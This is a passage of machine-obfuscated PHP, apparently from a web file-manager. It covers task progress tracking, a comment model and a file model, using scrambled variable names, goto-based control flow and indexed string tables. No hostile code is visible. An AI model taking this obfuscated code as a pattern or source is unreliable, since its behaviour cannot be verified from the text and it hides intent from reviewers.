$GLOBALS[$Aù‹’ÔºÜƒ[1559]] = $d«½†ù´Œ; $CêªÛ±ƒ· =& $this->task; goto f‚ãÆŸÓ¸ì; f‚ãÆŸÓ¸ì: $CêªÛ±ƒ·[$Aù‹’ÔºÜƒ[1546]] = $b£¦ Ûò—ã; $CêªÛ±ƒ·[$Aù‹’ÔºÜƒ[1548]] = (int) $aÅ„£­§¿¹->size($f™ÑØ‰‰Ÿ); $CêªÛ±ƒ·[$Aù‹’ÔºÜƒ[1549]] = 0; goto e¿°ŞŒ´À; F‡¡ª¿…İ: } public function copyFileEnd($fˆÉ¯“Ûêà, $féóÙƒ’Åİ, $FëÙ×÷’ç×, $eÛõ¯¬, $dŸ–ğóÍ×ä, $Eª–ïŞ®±¥) { $b®“ª²õÇÊ =& $_SERVER[¾÷]; $eã‚ğ§Ë„ =& $this->task; $eã‚ğ§Ë„[$b®“ª²õÇÊ[1549]] = $eã‚ğ§Ë„[$b®“ª²õÇÊ[1548]]; $eã‚ğ§Ë„[$b®“ª²õÇÊ[1550]] = $b®“ª²õÇÊ[43]; if ($dŸ–ğóÍ×ä == $eã‚ğ§Ë„[$b®“ª²õÇÊ[1546]]) { $eã‚ğ§Ë„[$b®“ª²õÇÊ[1552]] += $eã‚ğ§Ë„[$b®“ª²õÇÊ[1548]]; $eã‚ğ§Ë„[$b®“ª²õÇÊ[1553]] = $eã‚ğ§Ë„[$b®“ª²õÇÊ[1552]]; $this->update(1); } else { $this->update(); $eã‚ğ§Ë„[$b®“ª²õÇÊ[1549]] = 0; } self::log($b®“ª²õÇÊ[1561] . $féóÙƒ’Åİ . $b®“ª²õÇÊ[76] . $eÛõ¯¬ . $b®“ª²õÇÊ[9] . $dŸ–ğóÍ×ä . $b®“ª²õÇÊ[1562] . $eã‚ğ§Ë„[$b®“ª²õÇÊ[1546]]); } public function updateFileEnd($dçÍ‚Ä»Àé, $a³¹®›‡–) { goto A®Â¦¸ğô; BÙŒ³§Ôô‘: $this->update(1); self::log($a£§À‡Ì¤™[1563] . $dçÍ‚Ä»Àé); goto A—Éä©î‘ö; eïİ–½Ò±À: $a¥«ØçÄ—Ø[$a£§À‡Ì¤™[1548]] = $a³¹®›‡–; $a¥«ØçÄ—Ø[$a£§À‡Ì¤™[1552]] += $a³¹®›‡–; $a¥«ØçÄ—Ø[$a£§À‡Ì¤™[1553]] = $a¥«ØçÄ—Ø[$a£§À‡Ì¤™[1552]]; goto BÙŒ³§Ôô‘; A®Â¦¸ğô: $a£§À‡Ì¤™ =& $_SERVER[¾÷]; $a¥«ØçÄ—Ø =& $this->task; $a¥«ØçÄ—Ø[$a£§À‡Ì¤™[1546]] = $dçÍ‚Ä»Àé; goto eïİ–½Ò±À; A—Éä©î‘ö: } public function sourceModelCopy($fó”É‰Ş²) { goto bÄà¶Š‹Üï; bÄà¶Š‹Üï: $CÆôğËÚ· =& $_SERVER[¾÷]; $A‘’È„Â«Ö = $fó”É‰Ş²[0]; $cÂÊ¦ñ¾“à = $fó”É‰Ş²[1]; goto f’Á×ç¯; f’Á×ç¯: $F…½×œíØ° =& $this->task; $this->sourceModelCopyFlag = !0; $dè¢”õ…ˆã = 0; goto DÙÀîØÂõ²; DÙÀîØÂõ²: switch ($A‘’È„Â«Ö) { case $CÆôğËÚ·[539]: $dè¢”õ…ˆã = 1; break; case $CÆôğËÚ·[542]: $F…½×œíØ°[$CÆôğËÚ·[1546]] = $cÂÊ¦ñ¾“à[$CÆôğËÚ·[38]]; break; case $CÆôğËÚ·[544]: $dè¢”õ…ˆã = intval($fó”É‰Ş²[$CÆôğËÚ·[384]] * 0.4); break; case $CÆôğËÚ·[546]: $dè¢”õ…ˆã = intval($fó”É‰Ş²[$CÆôğËÚ·[384]] * 0.2); break; case $CÆôğËÚ·[548]: $dè¢”õ…ˆã = intval($fó”É‰Ş²[$CÆôğËÚ·[384]] * 0.4); break; } $this->update($dè¢”õ…ˆã); $this->sourceModelCopyFlag = !1; goto F‹òªã¥Ù; F‹òªã¥Ù: } public function sourceRemove($Bª„˜©¼ÄØ, $bÉƒ¿Îö–) { $CÀ„²ï÷‚ =& $_SERVER[¾÷]; $this->sourceModelCopyFlag = !0; $A¨÷Ú¹¿¹´ = 1; if (isset($Bª„˜©¼ÄØ[$CÀ„²ï÷‚[90]])) { $A¨÷Ú¹¿¹´ = $Bª„˜©¼ÄØ[$CÀ„²ï÷‚[90]][$CÀ„²ï÷‚[88]] + $Bª„˜©¼ÄØ[$CÀ„²ï÷‚[90]][$CÀ„²ï÷‚[89]] + 1; } $this->update($A¨÷Ú¹¿¹´); $this->sourceModelCopyFlag = !1; } public function sourceMove($FÈŠ½é¡÷Û) { $this->sourceRemove($FÈŠ½é¡÷Û, !1); } public function curlProgress($dˆĞ’‚êˆ¥, $E¶¿Õù™», $BÊÆšŸ–ä«, $E–ñèÔ‘‡ç, $Fğ¥óâØ) { $dÂõÙôÊÌµ =& $_SERVER[¾÷]; $C™ÄÒÃäøÁ =& $this->task; if ($Fğ¥óâØ > 0) { $C™ÄÒÃäøÁ[$dÂõÙôÊÌµ[1000]] = $dÂõÙôÊÌµ[1564]; $C™ÄÒÃäøÁ[$dÂõÙôÊÌµ[1550]] = $dÂõÙôÊÌµ[116]; if ($C™ÄÒÃäøÁ[$dÂõÙôÊÌµ[1548]]) { $C™ÄÒÃäøÁ[$dÂõÙôÊÌµ[1549]] = $Fğ¥óâØ; } if ($C™ÄÒÃäøÁ[$dÂõÙôÊÌµ[1551]]) { $C™ÄÒÃäøÁ[$dÂõÙôÊÌµ[1549]] = $Fğ¥óâØ + $C™ÄÒÃäøÁ[$dÂõÙôÊÌµ[1551]]; } } else { if ($BÊÆšŸ–ä« > 0) { if ($C™ÄÒÃäøÁ[$dÂõÙôÊÌµ[1548]] == $E¶¿Õù™») { $C™ÄÒÃäøÁ[$dÂõÙôÊÌµ[1549]] = $BÊÆšŸ–ä«; $C™ÄÒÃäøÁ[$dÂõÙôÊÌµ[1000]] = $dÂõÙôÊÌµ[1565]; $C™ÄÒÃäøÁ[$dÂõÙôÊÌµ[1550]] = $dÂõÙôÊÌµ[1070]; } } } $this->update(); } public function curlProgressStart($CéÄ¦Çæá†) { } public function curlProgressEnd($DÅõ «Õ„) { goto c¿®èÄÌœ; Dù’ÄŒğ©¹: $E¤…ïºÎØ† = $c¸‹ Ñ£èØ[$C÷İÎ³›ï[1566]]; if ($E¤…ïºÎØ† == -1) { $E¤…ïºÎØ† = $c¸‹ Ñ£èØ[$C÷İÎ³›ï[1567]]; } if ($dÑï©§­É†[$C÷İÎ³›ï[1550]] == $C÷İÎ³›ï[116] && $E¤…ïºÎØ†) { $dÑï©§­É†[$C÷İÎ³›ï[1551]] += $E¤…ïºÎØ†; } goto a™±É•Š¨…; a™±É•Š¨…: $this->update(); goto dï…ÜÜÊÆ¥; c¿®èÄÌœ: $C÷İÎ³›ï =& $_SERVER[¾÷]; $dÑï©§­É† =& $this->task; $c¸‹ Ñ£èØ = curl_getinfo($DÅõ «Õ„); goto Dù’ÄŒğ©¹; dï…ÜÜÊÆ¥: } } goto D½²«Ç§®½; E‚¬ğî¤Éà: class CommentModel extends ModelBase { protected $tableName = "\143\157\x6d\x6d\145\x6e\x74"; protected $tableMeta = array("\164\141\142\154\145\x4e\141\x6d\x65" => "\143\157\x6d\155\x65\156\x74\x5f\155\x65\x74\141", "\155\145\x74\x61\x46\x69\145\x6c\x64" => "\x63\157\x6d\x6d\x65\x6e\164\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($DÕéˆ¯ÏÑ°) { $DÜ„½Û¿…© =& $_SERVER[¾÷]; if ($DÕéˆ¯ÏÑ°[$DÜ„½Û¿…©[1696]]) { $d°ä·Î‡ß = $this->where(array($DÜ„½Û¿…©[1697] => $DÕéˆ¯ÏÑ°[$DÜ„½Û¿…©[1696]]))->find(); if (!$d°ä·Î‡ß || $d°ä·Î‡ß[$DÜ„½Û¿…©[407]] != $DÕéˆ¯ÏÑ°[$DÜ„½Û¿…©[407]] || $d°ä·Î‡ß[$DÜ„½Û¿…©[487]] != $DÕéˆ¯ÏÑ°[$DÜ„½Û¿…©[487]]) { return !1; } $this->where(array($DÜ„½Û¿…©[1697] => $DÕéˆ¯ÏÑ°[$DÜ„½Û¿…©[1696]]))->setAdd($DÜ„½Û¿…©[1698], 1); } $DÕéˆ¯ÏÑ°[$DÜ„½Û¿…©[1699]] = 0; $DÕéˆ¯ÏÑ°[$DÜ„½Û¿…©[1698]] = 0; $DÕéˆ¯ÏÑ°[$DÜ„½Û¿…©[711]] = 1; return $this->add($DÕéˆ¯ÏÑ°); } public function commentCount($d‚‰´Ü¹‘Â, $FŠÒ¤ë¯Ó‡) { goto cÑ£é’ê¹ä; cÑ£é’ê¹ä: $EŸ†¿ª»ªó =& $_SERVER[¾÷]; if (!$d‚‰´Ü¹‘Â) { return array(); } if (is_string($d‚‰´Ü¹‘Â) || is_int($d‚‰´Ü¹‘Â)) { $d‚‰´Ü¹‘Â = array($d‚‰´Ü¹‘Â); } goto B¬óÁ‹‚Ÿ; B¬óÁ‹‚Ÿ: $eëæõ®óã = array($EŸ†¿ª»ªó[487], $EŸ†¿ª»ªó[1700] => $EŸ†¿ª»ªó[483]); $EÈ…ÍŞÁè¤ = array($EŸ†¿ª»ªó[487] => array($EŸ†¿ª»ªó[17], $d‚‰´Ü¹‘Â), $EŸ†¿ª»ªó[407] => $FŠÒ¤ë¯Ó‡); $b´Ë¢Â…Ÿí = $this->field($eëæõ®óã)->where($EÈ…ÍŞÁè¤)->group($EŸ†¿ª»ªó[487])->select(); goto CšÔÚêä…Ì; CšÔÚêä…Ì: return array_to_keyvalue($b´Ë¢Â…Ÿí, $EŸ†¿ª»ªó[487], $EŸ†¿ª»ªó[483]); goto CàãÊõŞµÙ; CàãÊõŞµÙ: } public function remove($b¼ÙšŸ‹‚¬) { $B‘éê“ä¯ƒ =& $_SERVER[¾÷]; $EóãÛÜË¦¤ = array($B‘éê“ä¯ƒ[1697] => $b¼ÙšŸ‹‚¬); $aß›İòØğ = $this->where($EóãÛÜË¦¤)->find(); if ($aß›İòØğ[$B‘éê“ä¯ƒ[1696]]) { $this->where(array($B‘éê“ä¯ƒ[1697] => $aß›İòØğ[$B‘éê“ä¯ƒ[1696]]))->setAdd($B‘éê“ä¯ƒ[1698], -1); } return $this->where($EóãÛÜË¦¤)->delete(); } public function edit($e‘öï®îŠ³, $E±·ˆ—¨¨Û) { $cİçœ·ˆ—§ =& $_SERVER[¾÷]; $aÒİãÄˆ¹Í = array($cİçœ·ˆ—§[1697] => $e‘öï®îŠ³); return $this->where($aÒİãÄˆ¹Í)->save(array($cİçœ·ˆ—§[1701] => $E±·ˆ—¨¨Û)); } public function prasise($e¹ÒÇê‘Î†) { $fµïƒäáå› =& $_SERVER[¾÷]; $E‘Ôô‘ôí = Model($fµïƒäáå›[1702]); $Fš×¥ŠìÂø = array($fµïƒäáå›[1697] => $e¹ÒÇê‘Î†, $fµïƒäáå›[1497] => USER_ID); $B¤ƒ›ò‹•É = $E‘Ôô‘ôí->where($Fš×¥ŠìÂø)->find(); if (!$B¤ƒ›ò‹•É) { $E‘Ôô‘ôí->add($Fš×¥ŠìÂø); $D³©îË¬Å‰ = $this->where(array($fµïƒäáå›[1697] => $e¹ÒÇê‘Î†))->setAdd($fµïƒäáå›[1699], 1); } else { $E‘Ôô‘ôí->where($Fš×¥ŠìÂø)->delete(); $D³©îË¬Å‰ = $this->where(array($fµïƒäáå›[1697] => $e¹ÒÇê‘Î†))->setAdd($fµïƒäáå›[1699], -1); } return $D³©îË¬Å‰; } public function targetInfo($F„Óˆ«“ñŞ, $Cé™Ûäˆå) { goto dò‰ÎŠàÊ; Añå¯‚É™Ç: return $aÀ²µ‰Ø©›; goto Fî…‘©Ö×; aâåŞï¯Ï: $Dæİ‘±°³Ü = "\x52\x49\x47\x48\x54\40\x4a\117\x49\x4e\40{$this->tablePrefix}\x63\x6f\x6d\155\x65\156\x74\x5f\x70\x72\141\x69\x73\x65\x20\x73\x74\141\162\x20\x6f\x6e\40\x63\157\155\155\x65\x6e\164\x2e\x63\x6f\155\x6d\x65\x6e\x74\111\x44\40\75\40\x73\x74\141\x72\56\143\x6f\x6d\155\x65\x6e\x74\x49\x44"; $cÎø¾«ˆÔ“ = $this->alias($fÀ¯ÇòÏ[359])->where($dÑÛõ­)->join($Dæİ‘±°³Ü, $fÀ¯ÇòÏ[1703])->count(); $aÀ²µ‰Ø©› = array($fÀ¯ÇòÏ[1704] => $d¨ŸëˆâˆÈ, $fÀ¯ÇòÏ[1705] => $cÎø¾«ˆÔ“); goto Añå¯‚É™Ç; dò‰ÎŠàÊ: $fÀ¯ÇòÏ =& $_SERVER[¾÷]; $dÑÛõ­ = array($fÀ¯ÇòÏ[553] => $F„Óˆ«“ñŞ, $fÀ¯ÇòÏ[554] => $Cé™Ûäˆå); $d¨ŸëˆâˆÈ = $this->where($dÑÛõ­)->count(); goto aâåŞï¯Ï; Fî…‘©Ö×: } public function listData($fÔ®ƒ‚êŸ–) { $fµ£Ì‘’¶ =& $_SERVER[¾÷]; if (isset($fÔ®ƒ‚êŸ–[$fµ£Ì‘’¶[1706]])) { if ($fÔ®ƒ‚êŸ–[$fµ£Ì‘’¶[1706]]) { $fÔ®ƒ‚êŸ–[$fµ£Ì‘’¶[1707]] = array($fµ£Ì‘’¶[948], intval($fÔ®ƒ‚êŸ–[$fµ£Ì‘’¶[1706]])); } unset($fÔ®ƒ‚êŸ–[$fµ£Ì‘’¶[1706]]); } if (isset($fÔ®ƒ‚êŸ–[$fµ£Ì‘’¶[1708]])) { if ($fÔ®ƒ‚êŸ–[$fµ£Ì‘’¶[1708]]) { $fÔ®ƒ‚êŸ–[$fµ£Ì‘’¶[1707]] = array($fµ£Ì‘’¶[945], intval($fÔ®ƒ‚êŸ–[$fµ£Ì‘’¶[1708]])); } unset($fÔ®ƒ‚êŸ–[$fµ£Ì‘’¶[1708]]); } return $this->_listData($fÔ®ƒ‚êŸ–); } private function _listData($dÇ«Êë‰ØÀ) { $CÔ¿× ÆÔ =& $_SERVER[¾÷]; $BğáÖ›¸…Ë = $this->where($dÇ«Êë‰ØÀ)->_makeOrder()->selectPage(100); $this->_listAppendParent($BğáÖ›¸…Ë[$CÔ¿× ÆÔ[374]]); $this->_listAppendUser($BğáÖ›¸…Ë[$CÔ¿× ÆÔ[374]]); $this->_listAppendMeta($BğáÖ›¸…Ë[$CÔ¿× ÆÔ[374]]); return $BğáÖ›¸…Ë; } private function _makeOrder() { $B¼¹¬Ô‹ì =& $_SERVER[¾÷]; $a×Û¡›˜øŒ = array($B¼¹¬Ô‹ì[1699], $B¼¹¬Ô‹ì[1698], $B¼¹¬Ô‹ì[202]); $C¿Ø¥‘ÃÃ = Input::get($B¼¹¬Ô‹ì[438], $B¼¹¬Ô‹ì[17], $B¼¹¬Ô‹ì[419], $a×Û¡›˜øŒ); $eÛ›éñ­í = Input::get($B¼¹¬Ô‹ì[439], $B¼¹¬Ô‹ì[17], $B¼¹¬Ô‹ì[1499], array($B¼¹¬Ô‹ì[1709], $B¼¹¬Ô‹ì[434])); $c­·¼î®à = $C¿Ø¥‘ÃÃ . $B¼¹¬Ô‹ì[60] . $eÛ›éñ­í; return $this->order($c­·¼î®à); } private function _listAppendParent(&$céŞ¾¢Ôç“) { goto a¾ØŠß©Œ¾; a¾ØŠß©Œ¾: $dÒ–Â…¶ó =& $_SERVER[¾÷]; $DµâÒ˜ºß© = array_unique(array_to_keyvalue($céŞ¾¢Ôç“, $dÒ–Â…¶ó[43], $dÒ–Â…¶ó[1696])); $DµâÒ˜ºß© = array_remove_value($DµâÒ˜ºß©, $dÒ–Â…¶ó[500]); goto DŞö÷°ó; cÔ˜àŸµ«ˆ: foreach ($céŞ¾¢Ôç“ as &$FéÇëÛç–) { if (isset($CÄğî—¼ˆ½[$FéÇëÛç–[$dÒ–Â…¶ó[1696]]])) { $FéÇëÛç–[$dÒ–Â…¶ó[1710]] = $CÄğî—¼ˆ½[$FéÇëÛç–[$dÒ–Â…¶ó[1696]]]; } } unset($FéÇëÛç–); goto Eˆš—‚’õ; DŞö÷°ó: if (!$DµâÒ˜ºß©) { return; } $CÄğî—¼ˆ½ = $this->where(array($dÒ–Â…¶ó[1697] => array($dÒ–Â…¶ó[17], $DµâÒ˜ºß©)))->select(); $CÄğî—¼ˆ½ = array_to_keyvalue($CÄğî—¼ˆ½, $dÒ–Â…¶ó[1707]); goto cÔ˜àŸµ«ˆ; Eˆš—‚’õ: } private function _listAppendUser(&$cµ×Å©«Ó) { goto BÑîæ£òæâ; Fâ»´ˆä¤: foreach ($cµ×Å©«Ó as &$D¿¡Ç‘Î’) { $D¿¡Ç‘Î’[$FïèƒÍ Š‘[566]] = $d¿äß¥ãØ´[$D¿¡Ç‘Î’[$FïèƒÍ Š‘[1505]]]; if (isset($D¿¡Ç‘Î’[$FïèƒÍ Š‘[1710]])) { $D¿¡Ç‘Î’[$FïèƒÍ Š‘[1710]][$FïèƒÍ Š‘[566]] = $d¿äß¥ãØ´[$D¿¡Ç‘Î’[$FïèƒÍ Š‘[1710]][$FïèƒÍ Š‘[1505]]]; } } unset($D¿¡Ç‘Î’); goto e¥½Ìœâç„; dŠøÀ›§„Ú: if (count($F¢™ƒÈºÂŠ) == 0) { return; } foreach ($cµ×Å©«Ó as $D¿¡Ç‘Î’) { if (isset($D¿¡Ç‘Î’[$FïèƒÍ Š‘[1710]])) { $F¢™ƒÈºÂŠ[] = $D¿¡Ç‘Î’[$FïèƒÍ Š‘[1710]][$FïèƒÍ Š‘[1505]]; } } $d¿äß¥ãØ´ = Model($FïèƒÍ Š‘[510])->userListInfo($F¢™ƒÈºÂŠ); goto Fâ»´ˆä¤; BÑîæ£òæâ: $FïèƒÍ Š‘ =& $_SERVER[¾÷]; $F¢™ƒÈºÂŠ = array_unique(array_to_keyvalue($cµ×Å©«Ó, $FïèƒÍ Š‘[43], $FïèƒÍ Š‘[1505])); $F¢™ƒÈºÂŠ = array_remove_value($F¢™ƒÈºÂŠ, $FïèƒÍ Š‘[500]); goto dŠøÀ›§„Ú; e¥½Ìœâç„: } private function _listAppendMeta(&$C½Ÿâ —òä) { goto a„Ï¢¦İ•; b°Œ½ÃŒª: if (!$eš”Ö‰) { return !1; } foreach ($C½Ÿâ —òä as &$Dâëñ›å¡¬) { $Dâëñ›å¡¬[$BÁñÙ½‡òö[448]] = $eš”Ö‰[$Dâëñ›å¡¬[$BÁñÙ½‡òö[1707]]]; if (isset($Dâëñ›å¡¬[$BÁñÙ½‡òö[1710]])) { $Dâëñ›å¡¬[$BÁñÙ½‡òö[1710]][$BÁñÙ½‡òö[448]] = $eš”Ö‰[$Dâëñ›å¡¬[$BÁñÙ½‡òö[1710]][$BÁñÙ½‡òö[1707]]]; } } unset($Dâëñ›å¡¬); goto A¬ÓÒ¡’Ì; d´óµ°Š‚: if (!$c›‡Å‡Ç”Ì) { return; } foreach ($C½Ÿâ —òä as $Dâëñ›å¡¬) { if (isset($Dâëñ›å¡¬[$BÁñÙ½‡òö[1710]])) { $c›‡Å‡Ç”Ì[] = $Dâëñ›å¡¬[$BÁñÙ½‡òö[1710]][$BÁñÙ½‡òö[1707]]; } } $eš”Ö‰ = $this->metaList($c›‡Å‡Ç”Ì); goto b°Œ½ÃŒª; a„Ï¢¦İ•: $BÁñÙ½‡òö =& $_SERVER[¾÷]; $c›‡Å‡Ç”Ì = array_unique(array_to_keyvalue($C½Ÿâ —òä, $BÁñÙ½‡òö[43], $BÁñÙ½‡òö[1707])); $c›‡Å‡Ç”Ì = array_remove_value($c›‡Å‡Ç”Ì, $BÁñÙ½‡òö[500]); goto d´óµ°Š‚; A¬ÓÒ¡’Ì: } private function metaList($e½ ¤‘ˆù») { goto fÅ¥˜ÙÚÓ; fÅ¥˜ÙÚÓ: $e‘„ÇÆ¦İÏ =& $_SERVER[¾÷]; if (!$e½ ¤‘ˆù») { return array(); } $A«ëĞ¨Š° = array($e‘„ÇÆ¦İÏ[1707] => array($e‘„ÇÆ¦İÏ[17], $e½ ¤‘ˆù»)); goto DÃ„°õĞ¸Å; DÃ„°õĞ¸Å: $f„õ¬ˆ°» = Model($e‘„ÇÆ¦İÏ[1711])->where($A«ëĞ¨Š°)->select(); $f„õ¬ˆ°» = array_to_keyvalue_group($f„õ¬ˆ°», $e‘„ÇÆ¦İÏ[1707]); foreach ($f„õ¬ˆ°» as $F†ÄîÊ¬» => $fÃğœîĞæ) { $a˜ƒ°¢µÃ = array(); foreach ($fÃğœîĞæ as $C©íºÖÔìˆ) { $a˜ƒ°¢µÃ[$C©íºÖÔìˆ[$e‘„ÇÆ¦İÏ[102]]] = $C©íºÖÔìˆ[$e‘„ÇÆ¦İÏ[379]]; } $f„õ¬ˆ°»[$F†ÄîÊ¬»] = $a˜ƒ°¢µÃ; } goto E£“Ú¼‰; E£“Ú¼‰: return $f„õ¬ˆ°» ? $f„õ¬ˆ°» : array(); goto F¹­º¥òï; F¹­º¥òï: } } class FileModel extends ModelBase { protected $tableName = "\x69\157\137\146\151\154\x65"; protected $tableMeta = array("\x74\141\x62\x6c\145\116\141\x6d\145" => "\x69\157\x5f\146\x69\x6c\x65\137\155\145\164\x61", "\x6d\145\x74\x61\106\x69\145\x6c\x64" => "\146\151\154\145\111\104"); public function fileInfo($c¦êôğ²¹) { $C‹„Ä©“¥ =& $_SERVER[¾÷]; static $EÑ†–•–²Æ = array(); if (!isset($EÑ†–•–²Æ[$c¦êôğ²¹])) { $Fîö„¬áèÄ = $C‹„Ä©“¥[1712]; $a¥¨Ú‡á¼Ù = Model($C‹„Ä©“¥[453])->field($Fîö„¬áèÄ)->where(array($C‹„Ä©“¥[451] => $c¦êôğ²¹))->find(); $EÑ†–•–²Æ[$c¦êôğ²¹] = $a¥¨Ú‡á¼Ù; } return $EÑ†–•–²Æ[$c¦êôğ²¹]; } public function addFileByContent($c–¸³¤ƒâ = '', $døœ»ÈİŒÂ = '') { goto D¼“’À—¶¹; b¢İŞƒ—ÉÀ: if (file_exists($a†Í¾İÁÎ™)) { @unlink($a†Í¾İÁÎ™); } return $dÔõíåêØ; goto e¸Ëš¸Õ›È; fãÖÑß§Šª: $a†Í¾İÁÎ™ = $bŠÊ÷Æìá . $CäŞ†¹Ü‡ä[1714] . rand_string(16); file_put_contents($a†Í¾İÁÎ™, $c–¸³¤ƒâ); $dÔõíåêØ = $this->addFile($a†Í¾İÁÎ™, $døœ»ÈİŒÂ, !0); goto b¢İŞƒ—ÉÀ; D¼“’À—¶¹: $CäŞ†¹Ü‡ä =& $_SERVER[¾÷]; $bŠÊ÷Æìá = TEMP_PATH . $CäŞ†¹Ü‡ä[1713]; if (!is_dir($bŠÊ÷Æìá)) { mk_dir($bŠÊ÷Æìá); } goto fãÖÑß§Šª; e¸Ëš¸Õ›È: } public function createFileName($dì—®ø¤ğ, $AããÔâùßÑ = false, $d–¦÷‰º¼· = false) { goto BòÆ…°„¢; a±ôß¼•: if (!$dºµÅ®Ò©ğ && !Cache::get($b”øÄ×ù©ô)) { $dºµÅ®Ò©ğ = !0; $FÑ‹Ğ„Õ = IO::mkdir($DÊ¸×«¦); if (!IO::exist($FÑ‹Ğ„Õ . $DÑŒëÙ³©Ë[1716])) { IO::mkfile($FÑ‹Ğ„Õ . $DÑŒëÙ³©Ë[1716]); } Cache::set($b”øÄ×ù©ô, 1, 3600 * 2); } return $b„»†Ü¥Ï”; goto D—°Ô½‰…™; BòÆ…°„¢: $DÑŒëÙ³©Ë =& $_SERVER[¾÷]; $EÓ±¯ÎçñÄ = IO::init($DÑŒëÙ³©Ë[18]); $b„»†Ü¥Ï” = $this->makeFilePath($dì—®ø¤ğ, $EÓ±¯ÎçñÄ, $AããÔâùßÑ, $d–¦÷‰º¼·); goto EËÜßŒ”‡‡; EËÜßŒ”‡‡: $DÊ¸×«¦ = $EÓ±¯ÎçñÄ->pathFather($b„»†Ü¥Ï”); static $dºµÅ®Ò©ğ = false; $b”øÄ×ù©ô = $DÑŒëÙ³©Ë[1715] . md5($DÊ¸×«¦); goto a±ôß¼•; D—°Ô½‰…™: } public function makeFilePath($e¸‰‹°ôĞ, $aÃªë°ÉÑ, $DÁ¤»Ò÷ŞË = false, $f°èŒĞô„ = false) { goto fÛ•…êâÈÓ; Cµî¬ñóİ“: if (!$e¸‰‹°ôĞ) { $bœ·ƒ…½ˆ‰ = $E¹©¸¿¢[1719]; } switch ($bœ·ƒ…½ˆ‰) { case $E¹©¸¿¢[1720]: $A»‚âÈÀì = $A»‚âÈÀì . $E¹©¸¿¢[104] . $aÃªë°ÉÑ->ext($e¸‰‹°ôĞ); if ($d¹ŠèŠğ³ == $E¹©¸¿¢[1658]) { $A»‚âÈÀì .= $E¹©¸¿¢[1406]; } break; case $E¹©¸¿¢[1721]: goto Bµ’¶œ’²; b…§âÇŸÎ: $D­é§¹·² = $E¹©¸¿¢[1098] . $dòğèÔÖ¥Ñ[$E¹©¸¿¢[397]] . $E¹©¸¿¢[405] . date($E¹©¸¿¢[1723]) . $D¶ÂùªÌª÷ . $E¹©¸¿¢[18]; if ($d¹ŠèŠğ³ == $E¹©¸¿¢[1658]) { $e¸‰‹°ôĞ .= $E¹©¸¿¢[1406]; } $F½¢Šêæõ‘ = $E¹©¸¿¢[1724] . $D­é§¹·² . $e¸‰‹°ôĞ; goto Fš³Ñ‹íîì; Bµ’¶œ’²: $E—ƒñøë‘ = Model($E¹©¸¿¢[1100])->get($E¹©¸¿¢[1402]); $D¶ÂùªÌª÷ = substr(md5($E¹©¸¿¢[1722] . $E—ƒñøë‘ . date($E¹©¸¿¢[709])), 0, 8); $dòğèÔÖ¥Ñ = KodIO::defaultDriver(); goto b…§âÇŸÎ; Fš³Ñ‹íîì: CacheLock::lock($F½¢Šêæõ‘); $A»‚âÈÀì = $D­é§¹·² . $e¸‰‹°ôĞ; if (IO::exist($D­é§¹·² . $e¸‰‹°ôĞ)) { $dˆ©œ“íÂ = substr($e¸‰‹°ôĞ, 0, strlen($e¸‰‹°ôĞ) - strlen($d¹ŠèŠğ³)); $B¶²»”òŒ = $f°èŒĞô„ ? substr($f°èŒĞô„, 0, 5) : ($DÁ¤»Ò÷ŞË ? substr($DÁ¤»Ò÷ŞË, 0, 5) : rand_string(5)); $A»‚âÈÀì = $D­é§¹·² . $dˆ©œ“íÂ . $B¶²»”òŒ . $E¹©¸¿¢[104] . $d¹ŠèŠğ³; } goto C•¼²í»¥à; C•¼²í»¥à: if (IO::isTypeObject($A»‚âÈÀì) && !IO::isUploadServer($A»‚âÈÀì)) { $C‘Ì¬áøĞ­ = IO::setContent($A»‚âÈÀì, $E¹©¸¿¢[43]); if (!$C‘Ì¬áøĞ­) { show_json($E¹©¸¿¢[1725], !1); } } CacheLock::unlock($F½¢Šêæõ‘); break; goto EÅš‰ÃÙŒ¦; EÅš‰ÃÙŒ¦: case $E¹©¸¿¢[1719]: break; default: break; } return $A»‚âÈÀì; goto c°©õìƒï; a‚Ë¾Šëôì: $A»‚âÈÀì = $D­é§¹·² . rand_string(5) . short_id(100); $e¸‰‹°ôĞ = str_replace($E¹©¸¿¢[18], $E¹©¸¿¢[80], KodIO::clear($e¸‰‹°ôĞ)); $d¹ŠèŠğ³ = $aÃªë°ÉÑ->ext($e¸‰‹°ôĞ); goto Cµî¬ñóİ“; fÛ•…êâÈÓ: $E¹©¸¿¢ =& $_SERVER[¾÷]; $bœ·ƒ…½ˆ‰ = Model($E¹©¸¿¢[1100])->get($E¹©¸¿¢[1717]); $D­é§¹·² = KodIO::defaultIO() . date($E¹©¸¿¢[1718]); goto a‚Ë¾Šëôì; c°©õìƒï: } public function addFileByRemote($f‰·˜–İ‡, $Bë©±‘†ì×, $DÚ›¨›İ£Æ = array()) { goto Eî•‹¥¿Ó; b¿±·˜„‰½: $d…í†’µ¤ = IO::hashMd5($f‰·˜–İ‡, $cŞŞ“¤Ê¸Ê); $cëÁ“¨İ¢¥ = KodIO::defaultDriver(); $EÌ¾áŠ‹® = array($F½­´Ïï[552] => IO::size($f‰·˜–İ‡), $F½­´Ïï[1726] => 1, $F½­´Ïï[416] => $Bë©±‘†ì×, $F½­´Ïï[761] => $cëÁ“¨İ¢¥[$F½­´Ïï[397]], $F½­´Ïï[417] => $f‰·˜–İ‡, $F½­´Ïï[1727] => $DÚ›¨›İ£Æ[$F½­´Ïï[180]] ? $DÚ›¨›İ£Æ[$F½­´Ïï[180]] : IO::hashSimple($f‰·˜–İ‡), $F½­´Ïï[1728] => $d…í†’µ¤ ? $d…í†’µ¤ : $cŞŞ“¤Ê¸Ê); goto fÃàĞ¡¨ë; fÃàĞ¡¨ë: if ($f©¿–ã±ãê = $this->addFileCheckExist($EÌ¾áŠ‹®[$F½­´Ïï[180]], $EÌ¾áŠ‹®[$F½­´Ïï[179]], $EÌ¾áŠ‹®[$F½­´Ïï[87]])) { return $f©¿–ã±ãê; } return $this->addFileData($EÌ¾áŠ‹®); goto dá÷Ø¹¸Ã«; Eî•‹¥¿Ó: $F½­´Ïï =& $_SERVER[¾÷]; if (!IO::exist($f‰·˜–İ‡)) { return !1; } $cŞŞ“¤Ê¸Ê = $DÚ›¨›İ£Æ[$F½­´Ïï[179]] ? $DÚ›¨›İ£Æ[$F½­´Ïï[179]] : $F½­´Ïï[43]; goto b¿±·˜„‰½; dá÷Ø¹¸Ã«: } private function addFileData($c°¯±ºƒé) { 